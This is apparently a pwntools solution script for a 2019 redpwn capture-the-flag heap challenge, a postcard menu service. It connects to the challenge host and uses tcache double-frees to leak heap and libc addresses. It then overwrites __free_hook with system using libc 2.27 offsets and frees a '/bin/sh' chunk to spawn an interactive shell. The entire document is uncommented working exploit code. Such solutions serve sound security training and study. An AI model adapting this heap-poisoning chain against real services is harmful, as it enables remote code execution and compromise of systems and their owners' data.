from pwn import *

###Util
def create(idx):
    r.sendlineafter('Read a postcard\n','1')
    r.sendlineafter('envelope #?\n',str(idx))

def edit(idx,data):
    r.sendlineafter('Read a postcard\n','2')
    r.sendlineafter('envelope #?\n',str(idx))
    r.sendafter('Write.',data)

def delete(idx):
    r.sendlineafter('Read a postcard\n','3')
    r.sendlineafter('envelope #?\n',str(idx))

def show(idx):
    r.sendlineafter('Read a postcard\n','4')
    r.sendlineafter('envelope #?\n',str(idx))
    return r.recvline()[:-1]

###Addr
#  libc2.27
main_arena_offset = 0x3ebc40
unsorted_bin_offset = main_arena_offset+0x60
free_hook_offset = 0x3ed8e8
system_offset = 0x4f440

###Exploit
r = remote('chall.2019.redpwn.net',4010)

create(0)
create(1)
create(1)
delete(0)
delete(0)
heap = u64(show(0).ljust(8,b'\x00'))-0x260
delete(0)
create(0)
edit(0,p64(heap+0x250))
create(1)
create(0)
edit(0,p64(0)+p64(0xa1))
for i in range(8):
    print(i)
    delete(1)
unsorted_bin_addr = u64(show(1)+b'\x00\x00')
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(libc_base))
create(0)
delete(0)
delete(0)
create(0)
edit(0,p64(libc_base+free_hook_offset-8))
create(0)
create(0)
edit(0,b'/bin/sh\x00'+p64(libc_base+system_offset))
delete(0)
r.interactive()
